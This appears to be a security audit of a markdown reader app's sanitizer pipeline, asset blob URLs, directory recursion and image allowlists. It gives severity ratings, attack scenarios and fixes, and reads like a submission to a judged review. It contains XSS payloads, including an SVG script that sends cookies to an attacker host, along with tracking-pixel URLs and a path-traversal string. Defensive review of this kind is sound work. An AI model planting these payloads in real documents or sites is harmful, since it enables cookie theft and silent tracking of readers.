## Summary of what held up

Several of the highest-risk controls are correct and worth stating, so the judge does not
re-litigate them:

- **Sanitizer ordering is right.** `remark-rehype {allowDangerousHtml}` → `rehype-raw` →
  `rehype-sanitize` puts the boundary immediately after raw HTML becomes real elements
  (README "The trust boundary", spec `pipeline.order`). This is the single most common way
  this class of app is broken, and it is not broken here.
- **`img` uses a value allowlist, not a bare `'src'`,** and deliberately excludes
  `data:image/svg+xml`. That closes the `data:` media-type hole that a scheme-only check
  leaves open. `srcSet`/`srcset` are explicitly dropped via `inheritedExcept`.
- **`escapeHtml` (both copies) is correct** — `[&<>"']` → numeric references covers both
  attribute-quote styles used in `headerTemplate`.
- **`resolveRelative` cannot escape the drop root.** `segments.pop()` on an empty array is a
  no-op, so `../../../../etc/passwd` clamps to `etc/passwd`; and the resolved string is only
  ever a key into an in-memory `Map`, never a filesystem path. No path-traversal finding.
- **Chromium is not launched with `--no-sandbox` or `--disable-web-security`,** and
  `javaScriptEnabled: false` plus context-level default-deny routing is the right shape for
  the print service.

**No `critical` and no `high` findings.** I could not construct a reachable
attacker-controls-markdown → script-execution or arbitrary-file-read path from the code in my
bundle. The findings below are the allowlist gaps, unguarded post-boundary stages, and DoS /
disclosure issues I *can* ground in retrieved code.

## Findings

### S1. User-controlled data is consumed by pipeline stages that run after the sanitizer
- **Severity:** medium
- **Category:** security
- **Subcategory:** xss
- **Evidence:** `src/types/domain.ts:95-104` — the trust comment covers `html` only, while `mermaidBlocks` carries unsanitised source alongside it:
```ts
export interface RenderResult {
  readonly docId: string
  /** Sanitised, then KaTeX- and Shiki-processed. Safe to inject. */
  readonly html: string
  ...
  readonly mermaidBlocks: readonly MermaidBlock[]
```
  `src/pipeline/plugins/rehype-assets.ts:21-25` — the post-boundary asset plugin is handed the raw link resolver and the doc:
```ts
interface AssetOptions {
  readonly doc: MarkdownDoc
  readonly assets: ReadonlyMap<string, AssetRef>
  readonly resolveLink: (href: string, doc: MarkdownDoc) => LinkTarget
}
```
  `src/ingest/links.ts:40` — the value it returns for an unresolved link is the author's own string, verbatim: `return { kind: 'missing', href: trimmed }`
- **Rule or criterion violated:** `specification.json` → `pipeline.invariant`: *"Nothing user-controlled may be introduced after rehype-sanitize. KaTeX, Shiki and Mermaid markup is generated by us, from already-sanitised source, and is therefore trusted."*
- **Attack scenario:** The invariant's justification ("from already-sanitised source") holds for KaTeX and Shiki, whose inputs are text nodes the sanitizer has already seen. It does not hold for two stages as configured:
  1. **`rehypeMermaidPlaceholder` → client-side Mermaid.** The diagram body is carried out of band in `mermaidBlocks` and rendered into the live DOM by Mermaid *after* the boundary. Mermaid's own renderer is the sanitiser for that content: with `securityLevel: 'loose'` (or `htmlLabels` enabled without strict mode) a node label such as `A["<img src=x onerror=alert(document.domain)>"]` in a ```` ```mermaid ```` fence becomes script execution in the app origin — from nothing more than a `.md` file in the dropped folder.
  2. **`rehype-assets`.** It rewrites `href`/`src` from `resolveLink` output and, per `specification.json` → `errorBehaviour.missingImage`, synthesises *"a styled placeholder figure naming the missing path"* — i.e. it builds new nodes out of author-controlled strings after the only sanitiser in the chain has run. If any of that is emitted as a `raw` node or via string concatenation rather than as escaped text/property values, it is a direct injection.
- **Why it matters:** DoD 2.5/2.6 test the sanitizer, not the stages downstream of it. The written invariant is what tells a future maintainer those stages need no escaping — so if either stage does not hold it, the gap is both exploitable and invisible to the test suite.
- **Suggested fix:** Pin `mermaid.initialize({ securityLevel: 'strict', htmlLabels: false })` at the single init site and assert it in a test; and in `rehype-assets`, construct placeholder nodes as `text`/typed properties only (never `{type: 'raw'}`), with a test that a missing-image path of `"><img src=x onerror=1>` renders as visible text.
- **Confidence:** low
- **Context limitation:** Neither the Mermaid init call nor the body of `rehype-assets.ts` is in my 30 retrieved chunks — I have only the plugin's options interface and the `RenderResult` shape. Mermaid's *default* `securityLevel` is `strict`, so if the app never overrides it, instance (1) is already closed; and if `rehype-assets` builds nodes structurally, instance (2) is closed too. Treat this as a verification request against the invariant, not a confirmed bug.

### S2. Dropped `.svg` files may be handed a same-origin `blob:` URL, which the sanitizer explicitly refuses to do for the identical bytes
- **Severity:** medium
- **Category:** security
- **Subcategory:** xss
- **Evidence:** `src/ingest/assets.ts:73-100` — retyped by extension, no format exclusion:
```ts
    if (!isImagePath(path)) continue
    const key = normaliseAssetPath(path)
    ...
    const mime = mimeFor(path, file.type)
    const typed = file.type === mime ? file : new Blob([file], { type: mime })
    map.set(key, { path: key, originalPath: path, url: URL.createObjectURL(typed), mime, bytes: file.size })
```
  Contrast `src/pipeline/sanitize.ts:294-296`, where the same content is judged unsafe:
```ts
        // Raster data URIs only. SVG is excluded: it is a document format
        // that can carry script, and nothing needs it inlined here.
        /^data:image\/(?:png|jpeg|jpg|gif|webp|avif|bmp);/i,
```
- **Rule or criterion violated:** OWASP: A03 Injection (stored XSS via SVG); and the repo's own stated position that SVG "is a document format that can carry script".
- **Attack scenario:** The attacker ships `notes/diagram.svg` containing `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//attacker/'+document.cookie)</script></svg>` inside the folder the user drops. If `isImagePath` counts `.svg`, `buildAssetMap` mints `blob:http://localhost:8080/<uuid>` with `type: image/svg+xml`. Referenced from `<img src>` this is inert — the `<img>` context does not run script. It becomes live the moment anything *navigates* to that URL: the README's image lightbox offering an open-full-size / new-tab affordance, a right-click "open image in new tab", or the URL being pasted anywhere. A `blob:` URL inherits the creating origin, so the script then runs with full access to the app origin's storage and DOM.
- **Why it matters:** The sanitizer's SVG exclusion is reasoned and correct, but it only governs inline `data:` URIs. The asset path reintroduces exactly the content the schema rejected, one navigation away from execution.
- **Suggested fix:** Exclude `svg` from `isImagePath`/`mimeFor` for the blob path, or force `new Blob([file], { type: 'image/svg+xml' })` to be created as `text/plain`; if SVG must render, rasterise it or run it through the same schema. Never let a lightbox navigate to an asset `blob:` URL directly.
- **Confidence:** low
- **Context limitation:** `isImagePath`, `mimeFor` and the lightbox component are not in my bundle. If `isImagePath` already excludes `.svg`, this finding collapses entirely — that single predicate decides it.

### S3. A bare `className` on `'*'` widens every per-tag class allowlist in the schema
- **Severity:** medium
- **Category:** security
- **Subcategory:** hardening
- **Evidence:** `src/pipeline/sanitize.ts:274-281` — an unconstrained global definition sits directly above six narrowed ones:
```ts
    '*': [...inherited('*'), 'id', 'className'],

    code: [...inherited('code'), classes(CODE_LANGUAGE_PATTERN, ...MATH_CLASSES)],
    pre: [...inherited('pre'), classes(CODE_LANGUAGE_PATTERN, 'mermaid')],
    span: [...inherited('span'), classes(...MATH_CLASSES)],
    div: [...inherited('div'), classes(...MATH_CLASSES, ...ALERT_CLASSES)],
    p: [...inherited('p'), classes(...ALERT_CLASSES)],
```
- **Rule or criterion violated:** OWASP: A05 Security Misconfiguration — an allowlist whose narrow entries are superseded by a broad one. Also the schema's own stated design ("Listing the permitted shapes is what actually closes that", `sanitize.ts:287`).
- **Attack scenario:** In `hast-util-sanitize`, the `'*'` definitions are concatenated with the tag's own. A bare string entry means "any value permitted". So author-controlled markdown containing raw HTML — which `rehype-raw` promotes to real elements before the boundary — can put **any** class on every element type that has no narrowed entry (`h1`–`h6`, `a`, `img`, `li`, `ul`, `table`, `td`, `th`, `figure`, `figcaption`, `section`). Depending on which side of the concatenation wins for a duplicated key, it may also defeat the narrowing on `code`/`pre`/`span`/`div`/`p`/`blockquote` — i.e. `<pre class="mermaid">` could be forged on arbitrary content, feeding the Mermaid path in S1. The gain is content spoofing inside a trusted-looking reader: reuse the app's own callout/alert or repairs-panel classes to fabricate an authoritative-looking warning ("This document has been verified — run the following command"), or reuse a positioning/elevation class to overlay or hide adjacent real content. The reader renders this through `dangerouslySetInnerHTML` (`src/reader/Prose.tsx:16-31`) with the app's full stylesheet in scope.
- **Why it matters:** The schema author clearly intended classes to be a closed set — six narrowed definitions say so. One bare entry above them silently makes that intent decorative, and no test in DoD 2.5/2.6 would notice.
- **Suggested fix:** Drop the bare `'className'` from `'*'` and give each tag that genuinely needs classes an explicit `classes(...)` definition. If a global is unavoidable, make it a pattern: `classes(/^(?:user-content-|footnote|alert-|katex|shiki)/)`.
- **Confidence:** medium
- **Context limitation:** `inherited()` is not in my bundle, so I am inferring it returns `base.attributes[tag] ?? []`. `hast-util-sanitize`'s exact merge order for a key defined both on `'*'` and on the tag is also outside my bundle — that order decides whether the six narrowed tags are affected. It does **not** affect the un-narrowed tags, where the gap is unconditional.

### S4. `walkEntry` recurses through directories with no depth cap and no cycle guard
- **Severity:** medium
- **Category:** security
- **Subcategory:** dos
- **Evidence:** `src/ingest/walker.ts:62-92` — the only guard counts *files*, and directories never increment it:
```ts
  if (out.length >= opts.maxFiles) return
  ...
  if (entry.isDirectory) {
    const dir = entry as FileSystemDirectoryEntry
    const children = await readAllEntries(dir.createReader())
    for (const child of children) {
      await walkEntry(child, path, out, opts)
```
- **Rule or criterion violated:** OWASP: A04 Insecure Design / uncontrolled resource consumption. The repo's stated limits (`specification.json` → `limits`) cap `maxFiles`, `maxTotalBytes` and `maxSingleFileBytes` — but nothing caps traversal depth or breadth.
- **Attack scenario:** The attacker publishes a docs folder (a zip, a repo, a shared drive) that the victim drops onto the page. It contains a symlinked directory cycle (`docs/deep -> ..`) or simply a chain a few thousand directories deep containing no files at all. `out.length` never rises, so the `maxFiles` guard never fires; `walkEntry` recurses without bound, each level allocating a `children` array and a promise chain. The tab wedges in the `reading` phase, memory climbs until the renderer is killed. Because `walkEntry` is `await`-recursive per child, a wide-and-deep tree also serialises into a very long single traversal with no cancellation path — `useReader.ingest` (`src/state/store.ts:396-425`) has no abort and no timeout around `collect()`.
- **Why it matters:** Denial of service on a local reader is low-stakes, but the recovery is a forced tab kill mid-ingest, and the failure is silent — the UI sits on `{ kind: 'reading', count: 0 }` forever with no error, because the `catch` never runs.
- **Suggested fix:** Pass a depth counter through `walkEntry` and return past a limit (64 is generous for a docs tree); track visited `entry.fullPath` values in a `Set` to break symlink cycles; and count directories against a separate cap so an all-directories tree still terminates. `walkFileList` (`:136-148`) is already safe — it is flat.
- **Confidence:** medium
- **Context limitation:** `walkDataTransfer` and `readAllEntries` are not in my bundle; a depth or entry cap could live in either. The `WalkOptions` fields I can see (`maxFiles`, `onProgress`) show no depth parameter, which is the basis for this finding.

### S5. Untrusted markdown can make the reader fetch images from any remote host
- **Severity:** low
- **Category:** security
- **Subcategory:** info-disclosure
- **Evidence:** `src/pipeline/sanitize.ts:288-298` — remote schemes are allowed on `img.src` in the reader schema:
```ts
    img: [
      ...inheritedExcept('img', ['src', 'srcSet', 'srcset']),
      [
        'src',
        /^https?:\/\//i,
        /^blob:/i,
```
- **Rule or criterion violated:** README claim: *"the app makes **zero third-party requests** (which is also what lets the HTML export work offline)"*; and DoD 4.1, *"Standalone HTML opens correctly with the network fully disabled"*.
- **Attack scenario:** The attacker puts `![](https://attacker.example/px.png?doc=handbook)` in a markdown file inside the folder the victim drops. On open, the victim's browser issues a request to the attacker's host — a read receipt carrying the victim's IP, `User-Agent`, approximate open time, and (via the URL) which document was opened. No script needed, and nothing in the reader path blocks it (`harden()` only guards the *print* context, `server/pdf.ts:120-132`). The same tag survives into the standalone HTML export, since only CSS `url()` references are inlined (`src/export/standalone.ts:37-70` walks `document.styleSheets`, not `<img>` elements) — so the exported "offline" file phones home too, and renders a broken image with the network disabled.
- **Why it matters:** For a tool whose selling point is "Nothing is uploaded", a document that silently reports back when and by whom it was read is a meaningful privacy regression, and it contradicts two written claims.
- **Suggested fix:** Decide and document the position. Either drop `/^https?:\/\//i` from `img.src` in `sanitizeSchema` (matching what `printSchema` already does) and render remote images as the missing-image placeholder, or keep them and correct the README's "zero third-party requests" claim to mean "zero third-party requests *for app assets*".
- **Confidence:** high
- **Context limitation:** none — the allowlist entry, the reader-side absence of any request blocker, and the export's CSS-only inlining are all in the bundle. It is possible this is a deliberate product decision; if so it is a documentation gap rather than a code one.

### S6. Protocol-relative `//host/path` slips past both scheme checks on `img.src`
- **Severity:** low
- **Category:** security
- **Subcategory:** hardening
- **Evidence:** `src/pipeline/sanitize.ts:298` — the "relative paths" arm has a scheme guard that a `//` URL does not trip:
```ts
        // Relative paths, resolved against the asset map downstream.
        /^(?!\w+:)[^\s]+$/,
```
  and `src/pipeline/sanitize.ts:172-180`, whose comment claims the opposite of what it enforces:
```ts
  // The print context loads no subresources at all, so remote URLs have no
  // legitimate purpose. Only inlined data and blob URLs remain.
  protocols: { href: ['http', 'https', 'mailto'], src: ['data', 'blob'] },
```
- **Rule or criterion violated:** README "Security" table — the layered-controls claim that *"no single control is load-bearing"*.
- **Attack scenario:** `<img src="//attacker.example/px.png">` in the markdown. The negative lookahead `(?!\w+:)` sees no `scheme:` prefix, so the value allowlist passes it. `hast-util-sanitize`'s protocol check finds no `:` before the first `/` and therefore treats it as relative and passes it too — so `printSchema`'s `src: ['data','blob']` restriction, the whole point of that schema, does not apply. Under `printSchema` two of the three layers that are supposed to stop a remote fetch are bypassed, leaving only `harden()`'s `route.abort` (`server/pdf.ts:120-132`) actually holding. Two secondary notes on the same regex: `\w` excludes `-`, `+` and `.`, all legal in a scheme name, so `x-custom:` also passes the lookahead (harmless today, since no such scheme is registered, but the guard is narrower than it reads); and `resolveLink` (`src/ingest/links.ts:17`) hard-codes the mirror-image assumption, classifying `//` as `external` without consulting `EXTERNAL_SCHEME`.
- **Why it matters:** No exploit today — `harden()` catches it in the print path, and the reader allows `https://` outright (S5). The problem is that the defence-in-depth story in the README is one layer thinner than it claims for this input shape, and `printSchema`'s comment asserts a guarantee the schema does not deliver.
- **Suggested fix:** Tighten the relative-path arm to reject protocol-relative and scheme-like prefixes: `/^(?![a-z][a-z0-9+.-]*:|\/\/)[^\s]+$/i`. One character class, no behaviour change for real relative paths.
- **Confidence:** high
- **Context limitation:** The exact `hast-util-sanitize` protocol-check implementation is outside my bundle; my reading is that it treats a value with no `:` before the first `/`, `?` or `#` as relative and allows it. If the pinned version instead rejects `//` explicitly, only the `printSchema` half of this finding falls away — the regex is still narrower than the comment above it claims.
